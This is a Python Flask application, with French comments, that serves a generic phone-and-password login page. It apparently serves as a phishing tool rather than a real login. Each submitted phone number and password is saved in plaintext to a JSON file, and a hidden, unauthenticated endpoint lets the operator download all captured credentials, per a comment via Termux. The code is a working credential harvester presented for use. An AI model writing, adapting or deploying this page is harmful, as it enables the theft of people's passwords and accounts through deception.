import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
DATA_FILE = "messages.json"

# Initialiser le fichier JSON s'il n'existe pas
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump([], f)

# Ton interface HTML/CSS personnalisée et adaptée pour Flask
HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }
        h2 {
            margin-bottom: 20px;
            color: #333333;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666666;
            font-weight: bold;
        }
        input[type="tel"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .status {
            margin-top: 15px;
            text-align: center;
            font-weight: bold;
            font-size: 14px;
        }
        .success { color: #28a745; }
        .error { color: #dc3545; }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Se connecter</h2>
    <form id="loginForm">
        
        <div class="form-group">
            <label id="label-tel" for="phone">Numéro de téléphone :</label>
            <input 
                type="tel" 
                id="phone" 
                name="phone" 
                placeholder="Ex : 0612345678" 
                pattern="[0-9]{8,15}" 
                title="Veuillez entrer un numéro de téléphone valide (uniquement des chiffres, entre 8 et 15 caractères)." 
                required>
        </div>

        <div class="form-group">
            <label id="label-pass" for="password">Mot de passe :</label>
            <input 
                type="password" 
                id="password" 
                name="password" 
                placeholder="Votre mot de passe" 
                required>
        </div>

        <button type="submit">Connexion</button>
        
    </form>
    <div id="statusMessage" class="status"></div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const statusDiv = document.getElementById('statusMessage');
        statusDiv.className = 'status';
        statusDiv.innerText = 'Connexion en cours...';

        const payload = {
            phone: document.getElementById('phone').value,
            password: document.getElementById('password').value
        };

        fetch('/api/connexion', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => {
            if(data.status === 'success') {
                statusDiv.className = 'status success';
                statusDiv.innerText = '✅ Données transmises avec succès !';
                // Optionnel : vider le formulaire après envoi
                document.getElementById('password').value = '';
            } else {
                statusDiv.className = 'status error';
                statusDiv.innerText = '❌ Erreur lors du traitement.';
            }
        })
        .catch(() => {
            statusDiv.className = 'status error';
            statusDiv.innerText = '❌ Impossible de joindre le serveur.';
        });
    });
</script>

</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_INTERFACE)

# Route API pour recevoir et enregistrer les données du formulaire
@app.route("/api/connexion", methods=["POST"])
def connexion():
    try:
        data = request.get_json()
        if not data or "phone" not in data or "password" not in data:
            return jsonify({"status": "error", "message": "Données incomplètes"}), 400
        
        nouvelle_entree = {
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "phone": data["phone"].strip(),
            "password": data["password"].strip()
        }

        # Lire le fichier JSON existant, ajouter l'entrée, et sauvegarder
        with open(DATA_FILE, "r+", encoding="utf-8") as f:
            f_data = json.load(f)
            f_data.append(nouvelle_entree)
            f.seek(0)
            json.dump(f_data, f, indent=4, ensure_ascii=False)
            f.truncate()

        return jsonify({"status": "success", "message": "Enregistré"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Route API pour récupérer le fichier de données depuis Termux
@app.route("/api/recuperer-les-donnees-tsanta", methods=["GET"])
def recuperer():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            donnees = json.load(f)
        return jsonify(donnees), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
